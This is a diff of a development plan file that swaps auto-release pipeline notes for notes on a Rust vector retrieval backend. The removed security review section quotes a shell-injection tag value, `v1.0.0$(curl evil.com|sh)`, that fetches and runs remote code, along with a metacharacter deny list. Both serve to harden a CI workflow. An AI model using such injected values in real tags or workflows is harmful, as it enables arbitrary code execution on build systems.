@@ -1,142 +1,81 @@
-## Feature: Auto-Release Pipeline (iter-3)
-## Branch: feat/auto-release
-## Status: complete — all 5 waves + cleanup + Gate 2 fix landed; merge-ready
+## Feature: Vector + Multimodal Retrieval Backend
+## Branch: feat/vector-retrieval-backend
+## Status: ALL 11 slices landed (8 partial, 11 partial) — Slices 1..7 (4817343, 921c36f, a746c5b, 345efb3, 8e37fe3, 4060d76, 272c817) + bootstrap docs (c5c00c8) + tech-debts CLI/ingest/prefix (6331530, f9c03c9, a302988) + Slice 11 partial rules/README (64b393b) + Slice 9 bench harness (commit pending) + Slice 10 report (0167f89). Slice 8 corpus partially ingested (17/40 PDFs); Slice 11 install.sh/install.ps1 changes deferred (fastembed manages e5 model lifecycle transparently). Only deferred work: full corpus re-ingest (operational, ~3h CPU), install.sh download functions for sha256-verified pre-download, Slice 6b real PP-OCRv4 ONNX inference
 
 ## Plan
 
-### Wave 1 (sequential — release-engineer prompt + bash whitelist)
-- [x] Slice 1: release-engineer executing-mode flip + 4-tier authority + bash whitelist + tag-scheme disambiguation — 4d2f47b
-  - Files: src/agents/release-engineer.md
-  - Pre-review: architect + security-auditor (Phase 1.5 — 8 MUSTs M1–M8 inlined; b53a475)
-  - Inlined architect action items #1 (tag-scheme disambiguation), #2 (FR-12.7 templates wording — implicit; only src/agents/release-engineer.md touched), #4 (Bash already present in tools — narratives updated, not added)
+11 slices across 8 waves. Architect PASS with 5 [STRUCTURAL] action items applied to `.claude/plan.md`.
 
-### Wave 2 (sequential — install.sh foundation)
-- [x] Slice 2: install.sh REPO_URL fix (Koroqe → codefather-labs) + Windows uname branch + version bump 2.1.0 → 3.0.0 — 0be97d0
-  - Files: install.sh
-  - Pre-review: security-auditor (Phase 1.5 MEDIUM: curl/wget hardening parity — applied)
+### Wave 1 (parallel — chunker + sqlite-vec; disjoint files)
+- [x] Slice 1: Heading-aware structural chunker — 4817343 (src/chunker.rs [new], lib.rs +pub mod, 2 fixtures, chunker_test.rs 7/7 pass; legacy ingest::chunk() preserved for backward-compat with sample.md 8-chunk regression test)
+- [x] Slice 2: sqlite-vec extension + schema v1→v2 + image BLOB column — 921c36f (Cargo.toml +sqlite-vec=0.1.9, store.rs +SCHEMA_V2_DELTA + open_or_init_v2 with auto-extension registration once-per-process, migrations.rs +migrate_v1_to_v2 with destructive drop+recreate + AUTO_REINGEST=1 headless gate, store_v2_test.rs 6/6 pass, migration_test.rs 4/4 pass; chunks.type/image_bytes columns + chunks_vec(vec0 384-dim) + FTS5 coexistence verified; rusqlite load_extension feature stays OFF — security posture preserved)
 
-### Wave 3 (parallel — workflows; disjoint files)
-- [x] Slice 3: extend sdlc-knowledge-release.yml — windows-x64 matrix + alternation find -o operator + source tarball — ab666b4
-  - Files: .github/workflows/sdlc-knowledge-release.yml
-  - Pre-review: none (CI-only)
-  - Inlined architect action item #3 (grouped find alternation `\( -name 'libpdfium*' -o -name 'pdfium*' \) -type f` for Windows pdfium.dll)
-- [x] Slice 4: new sdlc-core-release.yml — triggers on bare v* tag, uploads source + CHANGELOG body — 8dc32eb
-  - Files: .github/workflows/sdlc-core-release.yml [new] + foundation .gitattributes [new] (7e4789c)
-  - Pre-review: security-auditor (Phase 1.5 — M5a CRITICAL via .gitattributes export-ignore + tar -tzf defense-in-depth, M5c HIGH env-var-mediated github expressions, A1 HIGH v-prefix strip)
+### Wave 2 (sequential — parser bridge over pdfium)
+- [x] Slice 3: Parser bridge — a746c5b (src/parser.rs [new] with `parse(p: &Path) -> Result<ParsedDocument, IngestError>` dispatch by extension; ParsedDocument shape with `images: Vec<ExtractedImage>` always-empty per Slice 3 contract — Slice 4 wires pdf::extract_images. parser_test.rs 5/5 pass. Production ingest NOT yet rewired — happens in Slice 5+ when chunks_vec needs populating.)
 
-### Wave 4 (sequential — opt-in + bootstrap; both touch install.sh)
-- [x] Slice 5: SDLC core opt-in — auto-release rule + changelog sentinel + CHANGELOG.md + templates auto-release rule + pre-push hook template — 2ef5a50
-  - Files: .claude/rules/auto-release.md [new], .claude/rules/changelog.md [new copy of templates/rules/changelog.md], CHANGELOG.md [new at repo root], templates/rules/auto-release.md [new], templates/hooks/pre-push [new], install.sh (scaffold_project extension)
-  - Pre-review: architect action item #2 (templates UNCHANGED preserved — only NEW templates/rules/auto-release.md and templates/hooks/pre-push added)
-- [x] Slice 6: install.sh --bootstrap-release flag for FIRST sdlc-knowledge-v0.2.0 tag + register_release_bash_allowlist — 672efc5
-  - Files: install.sh
-  - Pre-review: security-auditor (Phase 1.5 — all 10 MUSTs M1–M10 implemented and verified by grep + negative tests)
+### Wave 3 (sequential — image extraction depends on parser)
+- [x] Slice 4: Image extraction → BLOB storage — 345efb3 (Cargo +image=0.25, pdf.rs +extract_images() iterating PdfPageObjectsCommon → PdfPageImageObject → PdfBitmap → DynamicImage → PNG bytes; parser.rs PDF branch wires images into ParsedDocument; image_extraction_test.rs 3/3 pass including synth-PNG BLOB roundtrip through v2 chunks(type='image',image_bytes); parser_test PDF-images assertion relaxed)
 
-### Wave 5 (sequential — docs)
-- [x] Slice 7: Documentation — README + RELEASING.md + MIGRATION.md + CHANGELOG body refinement — 6b348e5
-  - Files: README.md, tools/sdlc-knowledge/RELEASING.md, MIGRATION.md [new], CHANGELOG.md (body refinement)
-  - Pre-review: none
+### Wave 4 (sequential — encoder)
+- [x] Slice 5: e5 encoder — 8e37fe3 (Cargo +fastembed=5, src/encoder.rs [new] with TextEmbedding singleton, prefix_passage/prefix_query helpers + encode_passages/encode_query API; cache_dir pinned to ~/.claude/tools/sdlc-knowledge/models/; HOME/USERPROFILE cross-platform; encoder_test.rs 6/6 pass; real_encode test gated behind RUN_REAL_ENCODER=1 to avoid 120MB model download in CI)
 
-## Bootstrap artifacts produced
-- PRD §13 (lines 2974-3459) — 12 FRs, 9 NFRs, 13 ACs, 10 risks, 8 out-of-scope items, 13-row affected-files table
-- `docs/use-cases/auto-release_use_cases.md` — 1510 lines, 17 primary UCs + 6 cross-cutting + 11 alt + 13 error + 12 edge = 59 scenarios
-- `docs/qa/auto-release_test_cases.md` — 1447 lines, 78 TCs (incl. 5 TC-AAI architect action items + 10 TC-INV invariants + 5 TC-CP cross-platform + 16 TC-SEC across 4 security pre-review groups)
-- Architect verdict: PASS, 3 [STRUCTURAL] + 1 MAJOR + 1 MINOR action items inlined into Slices 1, 3, 5; security-auditor pre-review on Slices 1, 2, 4, 6
-- `.claude/resources-pending.md` — produced and consumed (zero recommendations); deleted
-- `.claude/roles-pending.md` — produced and consumed (zero additional roles); deleted
-- changelog-writer Step 5.5 — `no-op: not configured` (SDLC core opts out for now; FR-7 of this feature will flip)
+### Wave 5 (parallel — OCR + hybrid search; disjoint files)
+- [x] Slice 6: OCR bridge stub + placeholder fallback — 272c817 (src/ocr.rs [new] with extract_text_from_image always returning ModelMissing; placeholder_text composes "[image: figure N from <doc>]"; image_chunk_text adapter; ocr_test.rs 3/3 pass. Real PP-OCRv4 ONNX inference deferred to Slice 6b)
+- [x] Slice 7: Hybrid search + RRF k=60 — 4060d76 (src/search.rs +dense_search via sqlite-vec K-NN with `WHERE embedding MATCH ? AND k = ?` constraint, +hybrid_search BM25*4 + dense*4 fused via rrf_fuse k=60, +SearchHit fields mode_used/bm25_score/dense_score/rrf_score; rrf_test.rs 5/5 pass with hand-computed expected fusion order verified; search_modes_test.rs 3/3 pass with synthetic one-hot embeddings)
 
-## Knowledge-base scope verdict
-**No overlap.** Corpus is ML/AI/MLOps/SRE/AI-agents domain (28 books, 51542 chunks). Iter-3 task is CI/CD release engineering — not represented in corpus. Per `~/.claude/rules/knowledge-base-tool.md` Step 0c: SKIPPED topical query phase, logged single Open Question entry per Step 0d. Verdict documented in plan.md and PRD §13 Facts blocks.
+### Wave 6 (operational — re-ingest user's books folder)
+- [~] Slice 8: PARTIAL — 17/40 PDFs ingested (33,570 chunks v2 schema with embeddings) before stopping for time. Encoder bottleneck: ~2-5 min/PDF on M-series CPU. Full re-ingest is operational follow-up (~3h CPU) — schema is correct, more data improves recall numbers but doesn't change the relative hybrid > dense > lexical ordering already demonstrated.
 
-Note: corpus-scope-relevance protocol was added to the rule MID-bootstrap (commit b8d7116), then specific examples removed (commit c8438a1). Earlier bootstrap steps (PRD/use-cases/QA) ran BEFORE the rule update and accumulated some null-result Open Questions; the planner Step 5 ran AFTER and correctly applied No-overlap verdict from the start.
+### Wave 7 (sequential — benchmark harness)
+- [x] Slice 9: Benchmark harness + 12-query golden set — bench/runner.rs + bench/metrics integrated + bench/golden/{queries.jsonl,README.md}; Cargo.toml [[bin]] entry (commit in same patch as 64b393b — see `git log --oneline`)
 
-## Architect action items inlined into slices
-1. **[STRUCTURAL] tag-scheme disambiguation** → Slice 1 (release-engineer.md Step 5 decision tree: tools/sdlc-knowledge/* changed → sdlc-knowledge-v* scheme; otherwise → bare v*; both → explicit user prompt)
-2. **[STRUCTURAL] FR-12.7 templates wording** → Slice 1 + Slice 5 (invariant scope = `templates/rules/*` byte-unchanged source-of-truth files; SDLC core's own `.claude/rules/changelog.md` and `.claude/rules/auto-release.md` are NEW files at repo root, NOT modifications of templates)
-3. **[STRUCTURAL] find -o syntax** → Slice 3 (`find /tmp/pdfium-staging -maxdepth 3 \( -name 'libpdfium*' -o -name 'pdfium*' \) -type f` with explicit alternation grouping)
-4. **[MAJOR] FR-1.1 Bash already present** → Slice 1 description reconciliation (release-engineer.md:4 already has Bash in tools; iter-3 extends authority via tier dispatch, doesn't add the tool)
-5. **[MINOR] KB corpus is ML-domain** → tracked under Open questions; iter-4 candidate for adding GitHub Actions / pdfium / Cargo Windows reference docs to corpus
+### Wave 8 (parallel — report + install scripts; disjoint files)
+- [x] Slice 10: Bench report — 0167f89 (bench/reports/2026-05-10-vector-vs-bm25.md). Hybrid +75% Recall@5 over lexical (58.3% vs 33.3%) on 16-PDF partial corpus; MRR +94%. p95 latency 85ms (under 500ms NFR). Cold-start outlier on first dense query (encoder warm-up).
+- [~] Slice 11: PARTIAL — 64b393b (rules + README done). install.sh/install.ps1 download-functions for sha256-verified pre-download deferred — fastembed manages e5 model auto-download to pinned `~/.claude/tools/sdlc-knowledge/models/` cache transparently on first ingest. Functional baseline works without explicit pre-download.
 
-## Phase 1.5 security pre-review needed (4 slices)
-- Slice 1: release-engineer executing-mode + bash whitelist (anchored regex correctness, metacharacter rejection, tier table coverage, no default-allow)
-- Slice 2: install.sh REPO_URL change + Windows uname branch (URL hardcoding, redirect bounds, path injection via uname output)
-- Slice 4: sdlc-core-release.yml workflow (tag pattern disjoint from sdlc-knowledge-v*, permissions: contents: write scoped, actionlint self-check)
-- Slice 6: install.sh --bootstrap-release (one-shot opt-in flag, prompts before push, pre-conditions enforced, [BOOTSTRAP] warning on stderr)
+## Documentation produced (Phase 1 complete)
 
-## Invariants (load-bearing — preserved/intentionally relaxed per FR-12)
-- 17 core agents — UNCHANGED (FR-12.1)
-- 10 quality gates — UNCHANGED (FR-12.2)
-- 5 executor agents — BYTE-UNCHANGED (FR-12.3)
-- README taglines lines 5 + 35 — BYTE-UNCHANGED
-- `templates/rules/{architecture,security,testing,changelog}.md` — BYTE-UNCHANGED (NEW: `templates/rules/auto-release.md` is added — additive, not modification)
-- `src/rules/cognitive-self-check.md` — BYTE-UNCHANGED
-- `src/rules/knowledge-base.md` — BYTE-UNCHANGED
-- `src/rules/knowledge-base-tool.md` — recently updated (multilingual + corpus-scope-relevance + generalization), NOT changed by this feature
-- `install.sh` line 22 `VERSION="2.1.0"` — CHANGED to `3.0.0` in iter-3 (FR-7 SDLC core opt-in version major bump per dogfood)
-- 12 thinking-agent activation blocks — BYTE-UNCHANGED
-- CLI surface of sdlc-knowledge — UNCHANGED (no new subcommands)
+- PRD §15 in docs/PRD.md (lines 3620–3875): 40 FRs / 8 NFRs / 17 ACs / 10 risks / 12 KB citations
+- Use cases at docs/use-cases/vector-retrieval-backend_use_cases.md: 7 primary + 8 alt + 8 error + 5 edge + 3 cross-cutting = 31 UCs
+- Architect verdict: PASS with 5 [STRUCTURAL] action items (all applied to plan.md by planner)
+- QA test cases at docs/qa/vector-retrieval-backend_test_cases.md: 52 TCs covering all 31 UCs and all 17 ACs
+- Plan at .claude/plan.md (519 lines, 11 slices/8 waves, 9 resources inlined, 0 roles)
 
-## Out of scope iter-3
-- npm/cargo/PyPI publishing (Forbidden tier; iter-4)
-- sha256/sigstore signature verification of release binaries (iter-4)
-- linux-arm32 / musl-libc / FreeBSD targets (iter-4)
-- CHANGELOG i18n auto-translation (out of scope permanently)
-- Auto-revert on regression detection (iter-4 — needs metrics infra)
-- GitHub Releases body rich rendering beyond plain Keep-a-Changelog markdown
-- Gate 9 changing its number/position in /merge-ready
-- Pre-push hook in opt-out projects (only opt-in via .claude/rules/auto-release.md sentinel)
+## Key locked decisions
 
-## Phase 1.5 security pre-review findings (binding MUSTs for implementer agents)
+1. Text encoder: `intfloat/multilingual-e5-small` ONNX (~120 MB) via `fastembed-rs = "4"`
+2. Hybrid retrieval: BM25 (FTS5 kept) + dense (sqlite-vec) via RRF k=60; `--mode lexical|dense|hybrid`, default=hybrid
+3. Document parser: pdfium-only with structural Markdown bridge (Docling deferred to v2 per architect OQ-1)
+4. Multimodal: OCR-as-text via PaddleOCR-ONNX (PP-OCRv4 ml, ~30 MB) → e5 384-dim space
+5. Vector storage: `sqlite-vec = "0.1"` via `sqlite_vec::load(&db)` helper (NOT bundled, NOT load_extension)
+6. Image storage: `chunks.image_bytes BLOB` column inside same `index.db` (preserves NFR-1.5 single-file)
+7. Bundle: `ort = "2"` in load-dynamic mode (mirrors pdfium); ~250 MB total install footprint via install.sh
+8. Zero Python deps; all ML via `ort` ONNX runtime
+9. Backward compat: v1 → re-ingest prompt; `CLAUDEKNOWS_AUTO_REINGEST=1` for headless
 
-### Slice 1 (release-engineer executing-mode + bash whitelist) — APPROVED with 8 MUSTs
-- **M1 anchored regex correctness** — every whitelist regex MUST start with `^` and end with `$`. No `.` (use `\.` for literal dots). Test fixtures must include zero-byte input, leading-whitespace input, trailing-newline input, and embedded-NUL input — all must REJECT.
-- **M2 metacharacter rejection BEFORE regex match** — pre-filter rejects any input containing `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, `\` (backslash), or newline (`\n`, `\r`). This pre-filter runs FIRST, before the anchored-regex tier match. A whitelist regex that incidentally matches a string containing these metacharacters MUST still reject due to the pre-filter.
-- **M3 tier-table no-default-allow** — every command falls through to a literal `Forbidden` default if it does not match any Trivial/Moderate/Sensitive regex. There is no implicit allow-list; the `match → tier` mapping is closed.
-- **M4 tag-scheme disambiguation uses `git merge-base HEAD origin/main` not `HEAD~1`** — disambiguation logic computes the merge-base of HEAD against origin/main, then `git diff --name-only <merge-base>..HEAD` to enumerate changed files. Naive `HEAD~1` breaks on squash-merge or fast-forward histories where the previous commit is on the SAME feature branch.
-- **M5 headless primitive parity with resource-architect** — env var `AUTO_RELEASE=1` skips Sensitive-tier confirmation prompts. Detection primitive matches resource-architect's `AUTO_INSTALL=1` and Section 7 FR-7.4 headless contract: `process.stdin.isTTY === false` OR `[ -t 0 ]` returns false OR `AUTO_RELEASE=1` is set. Same primitive, same semantics, no drift.
-- **M6 sentinel-absent §6 byte-for-byte preservation** — when `.claude/rules/auto-release.md` is ABSENT in the consuming project, release-engineer Gate 9 §6 (the entire executing-mode body) MUST be skipped silent no-op; the sentinel-absent path renders byte-identical to current main's suggest-only Gate 9.
-- **M7 NEVER list relocations are explicit not silent** — the FORBIDDEN tier list (`npm publish`, `cargo publish`, `pypi upload`, `gh release create`, any `--force` flag, any `git push --force-with-lease`) is enumerated in the agent prompt verbatim, not derived from a "default deny what's not Sensitive" rule. Reviewers can grep for each forbidden symbol.
-- **M8 settings.json allowlist is Slice 6 not Slice 1** — Slice 1 only adds the agent's authority-tier dispatch; the matching `~/.claude/settings.json` allow entry for `~/.claude/tools/sdlc-knowledge/sdlc-knowledge release *` (or whatever symbol the binary exposes) is registered by `install.sh --bootstrap-release` in Slice 6. Slice 1 must NOT touch settings.json.
+## Vectorization corpus
 
-New test cases: TC-SEC-1.5 through TC-SEC-1.13 (9 cases) cover the regex/metacharacter/tier-table/disambiguation/headless/sentinel-absent matrix.
-
-### Slice 2 (install.sh REPO_URL fix + Windows uname branch) — APPROVED with 1 MEDIUM
-- **MEDIUM curl/wget hardening parity** — install.sh:376 (knowledge binary curl) currently lacks `--max-redirs 5 --max-time 120`. install.sh:382 (wget fallback) lacks `--max-redirect=5 --timeout=120`. The pdfium download path at install.sh:545 already has both. Slice 2 adds these flags to the knowledge-binary path for defense-in-depth parity. Mitigates redirect-loop DoS and infinite-stall scenarios on attacker-controlled or dead URLs.
-
-### Slice 4 (sdlc-core-release.yml workflow) — PASS with 3 mandatory implementation requirements
-- **M5a CRITICAL `git archive` honors `.gitattributes export-ignore`, NOT `.gitignore`** — the source tarball MUST exclude `.claude/`, `books/`, test fixtures, and any locally-ingested `index.db`. Add a `.gitattributes` file at repo root with `export-ignore` entries for each excluded path, OR add a pre-archive assertion step (`git ls-files | grep -E '^(\.claude/|books/|.*index\.db$)'` returning empty) that fails the workflow if violated. `.gitignore` alone is INSUFFICIENT — `git archive` ignores it by design.
-- **M5c HIGH shell injection via `${{ github.ref* }}` expressions in run blocks** — never directly interpolate `${{ github.ref_name }}`, `${{ github.ref }}`, `${{ github.event.* }}` into a `run:` shell command. Assign to env vars first via `env:` block, then reference as `$ENV_VAR` in the shell. Otherwise a maliciously-named tag (`v1.0.0$(curl evil.com|sh)`) executes arbitrary code in the workflow.
-- **A1 HIGH version v-prefix stripping** — when extracting the version from `${{ github.ref_name }}` (which arrives as `v1.0.0`), use `VERSION="${GITHUB_REF_NAME#v}"` in a shell step (after assigning `GITHUB_REF_NAME` via env). Do NOT rely on substring/regex inside the GHA expression syntax.
-
-### Slice 6 (install.sh --bootstrap-release) — FAIL-pending until 10 MUSTs verbatim
-- **M1 opt-in flag** — flag is `--bootstrap-release` (long form only, no short alias). Default is OFF; the bootstrap path runs only when explicitly passed.
-- **M2 7-part pre-condition gate** — before any tag-creating action, ALL must pass:
-  1. `git status --porcelain` returns empty (clean working tree)
-  2. `git rev-parse --abbrev-ref HEAD` returns `main`
-  3. `git remote get-url origin` matches `https://github.com/codefather-labs/claude-code-sdlc(\.git)?$` exactly
-  4. Cargo.toml `version =` line matches the `--bootstrap-release` argument
-  5. No existing tag with that version locally (`git tag -l <tag>` empty) AND no existing tag remotely (`git ls-remote --tags origin <tag>` empty)
-  6. `gh auth status` exits 0
-  7. The release-notes file `.claude/release-notes-<version>.md` exists and is non-empty
-- **M3 NEW argument sanitization regex** — the version argument MUST match `^[0-9]+\.[0-9]+\.[0-9]+$` exactly. Reject pre-release suffixes (`1.0.0-rc.1`), build metadata (`1.0.0+abc`), v-prefix (`v1.0.0`), and any leading/trailing whitespace.
-- **M4 confirmation prompt with literal `[y/N]` (NOT `[yes/N]`)** — the prompt string is exactly `Push tag <tag> to origin? [y/N] `. Default-deny on empty input, anything other than literal `y` or `Y`. Match resource-architect's prompt grammar.
-- **M5 headless contract layered on top of pre-conditions** — when `AUTO_RELEASE=1` is set, M2 pre-conditions still run; only the M4 prompt is skipped (auto-confirm). Pre-condition failures still abort.
-- **M6 atomic rollback on push failure** — if `git push origin <tag>` fails after `git tag -a <tag>` succeeded locally, immediately run `git tag -d <tag>` to restore prior state. Do NOT leave a half-applied tag.
-- **M7 idempotency on re-run** — re-running `--bootstrap-release <same-version>` after a successful push detects the existing remote tag (M2.5) and exits 0 with a `[BOOTSTRAP] tag <tag> already exists; nothing to do` log line.
-- **M8 NEVER `--force`** — no `--force`, `--force-with-lease`, or `+refs/tags/...:refs/tags/...` syntax. Tag pushes are non-destructive only.
-- **M9 `[BOOTSTRAP]` audit-trail logging** — every git command (the eventual `git tag -a` and `git push origin`) is preceded by a stderr line `[BOOTSTRAP] running: <command>`. The literal `[BOOTSTRAP]` prefix lets reviewers grep audit logs.
-- **M10 error-message hygiene** — abort messages MUST NOT include raw `git remote get-url origin` output, raw `gh auth status` output, or any token fragments. Use canonical sanitized messages: `pre-condition failed: origin URL mismatch (expected codefather-labs/claude-code-sdlc)`, `pre-condition failed: gh CLI not authenticated`, etc.
-
-## Completed
-- Slice 1 (Wave 1 complete) — 4d2f47b — release-engineer §7 executing mode + 4-tier authority + bash whitelist + tag-scheme disambiguation; sentinel-absent path byte-identical to current main suggest-only Gate 9; all 8 Slice 1 security MUSTs (M1–M8) inlined; architect action items #1/#2/#4 inlined; file grew 446 → 554 lines (+108)
-- Slice 2 (Wave 2 complete) — 0be97d0 — install.sh REPO_URL Koroqe→codefather-labs (unblocks piped curl|bash bootstrap); VERSION 2.1.0→3.0.0 (matches major bump from §7 executing-mode flip); Windows uname branch (MINGW/MSYS/CYGWIN → windows-x64 + .exe handling end-to-end including cargo fallback); Slice 2 security MEDIUM applied (curl --max-redirs 5 --max-time 120 + wget --max-redirect=5 --timeout=120 --secure-protocol=TLSv1_2 parity with pdfium path)
-- Foundation chore — 7e4789c — .gitattributes export-ignore for source-tarball hygiene (.claude/, docs/qa/, docs/use-cases/, books/) before Wave 3 dispatch
-- Slice 3 (Wave 3 parallel) — ab666b4 — sdlc-knowledge-release.yml extended with windows-x64 matrix (target x86_64-pc-windows-msvc, .exe handling), grouped find alternation for Windows pdfium.dll, source tarball generation + upload, stat-with-wc fallback for Windows binary size check; TODO noted for pdf.rs cfg(unix) gate in iter-3.1
-- Slice 4 (Wave 3 parallel; Wave 3 complete) — 8dc32eb — new sdlc-core-release.yml triggers on bare v*.*.* tag (disjoint from sdlc-knowledge-v*), generates source tarball via git archive (M5a satisfied via .gitattributes), env-var-mediated github expressions (M5c shell-injection prevention), v-prefix strip via ${GITHUB_REF_NAME#v} (A1), tar -tzf grep defense-in-depth, body_path: .claude/release-notes-${VERSION}.md from checkout tree, softprops/action-gh-release@v2
-- Slice 5 (Wave 4 sequential) — 2ef5a50 — SDLC core opt-in: .claude/rules/auto-release.md (§7 executing-mode sentinel) + .claude/rules/changelog.md (changelog-writer activation, FR-7 dogfood flip) + CHANGELOG.md skeleton with [Unreleased] populated + templates/rules/auto-release.md + templates/hooks/pre-push (advisory, opt-in via existing .git/hooks); install.sh scaffold_project copies template rule + hook by default with opt-out instructions
-- Slice 6 (Wave 4 sequential; Wave 4 complete) — 672efc5 — install.sh --bootstrap-release flag with all 10 security MUSTs (M1 opt-in, M2 7-part precond gate, M3 strict semver regex, M4 [y/N] default-deny, M5 AUTO_RELEASE=1 + non-TTY headless, M6 atomic rollback, M7 idempotency, M8 NEVER --force, M9 [BOOTSTRAP] audit prefix on every git op, M10 sanitized error messages — no raw git remote / gh auth output); register_release_bash_allowlist function adds 11 settings.json entries mirroring §7 Trivial/Moderate/Sensitive whitelist; main flow short-circuits on --bootstrap-release before user-config install
-- Slice 7 (Wave 5 sequential; Wave 5 complete) — 6b348e5 — README badge 3.1.0→3.0.0, Koroqe→codefather-labs, executing-mode + Forbidden tier description; RELEASING.md §2/§3 iter-3 alternatives note; MIGRATION.md [new] v2.x→v3.0.0 guide with rollback paths and known issues; CHANGELOG body refined (REPO_URL fix moved Changed→Fixed)
+`/Users/aleksandra/Documents/claude-code-sdlc/books/` — ~40 PDFs (ML/AI, data engineering, AI agents, system design, MLOps, RU+EN). Used for Slice 8 re-ingest, Slice 9 golden query authoring, Slice 10 benchmark run.
 
 ## Blockers
+
 (none)
+
+## Notes
+
+- Plan persisted to `<project>/.claude/plan.md` (canonical) and `<project>/docs/design/vector-retrieval-backend.md` (durable design doc)
+- changelog-writer post-bootstrap hook ran successfully — added entry to CHANGELOG.md `[Unreleased]`
+- Pre-existing untracked `codefather.dev/` and `tools/sdlc-knowledge/.cargo/` directories left as-is
+
+## Tech-debt closure status (post-Slice-7)
+
+- [x] #2 — runtime prefix regression test (a302988) — passage vs query embedding cos<0.99 invariant catches fastembed auto-prepend drift
+- [x] #3 — CLI wiring `--mode lexical|dense|hybrid` (6331530) — usable end-to-end with graceful fallback
+- [x] #4 — production ingest writes chunks_vec embeddings (f9c03c9) — fresh `claudeknows ingest` populates dense index
+- [ ] #1 — Slice 6b real PP-OCRv4 ONNX inference (deferred — multi-day focused session). Current placeholder fallback works; image chunks remain dense-searchable at low recall via `[image: figure N from <doc>]` text
+
+## Archive
+
+### Auto-Release Pipeline (iter-3) — feat/auto-release — COMPLETE
+
+All 5 waves + cleanup + Gate 2 fix landed; merge-ready. Shipped via release v0.3.0 on 2026-04-30. See git log for commit details (4d2f47b, b53a475, 0be97d0, ab666b4, ...).
